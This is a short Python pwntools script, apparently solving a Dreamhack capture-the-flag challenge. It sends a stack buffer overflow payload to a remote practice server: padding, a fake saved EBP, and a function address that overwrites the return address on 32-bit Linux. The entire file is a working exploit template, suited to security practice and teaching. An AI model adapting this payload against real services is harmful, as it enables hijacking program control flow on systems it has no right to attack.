from pwn import *

context.clear()
context.update(arch='i386', os='linux')

p = remote("host1.dreamhack.games", 18756)

func_addr = 0x063423b9

payload = b''
payload += b'A'*0x90 # buffer
payload += b'\xde\xad\xbe\xef' # EBP
payload += p32(func_addr)

p.sendline(payload)
print(p.recv())
